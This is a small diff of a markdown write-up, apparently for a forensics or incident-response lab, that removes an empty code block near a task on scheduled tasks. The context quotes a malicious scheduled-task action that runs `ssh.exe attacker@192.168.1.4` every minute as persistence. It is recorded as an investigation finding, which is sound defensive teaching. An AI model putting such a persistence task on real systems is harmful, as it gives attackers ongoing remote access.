@@ -56,9 +56,6 @@ schtasks /query /tn $taskName /xml > $dest
 * **Action:** `C:\\Windows\\System32\\OpenSSH\\ssh.exe attacker@192.168.1.4`
 * **Interval:** every 1 minute (trigger)
 
-````
-
-````
 ---
 
 # Task 5 — Investigating Recently Accessed Files (LNK)
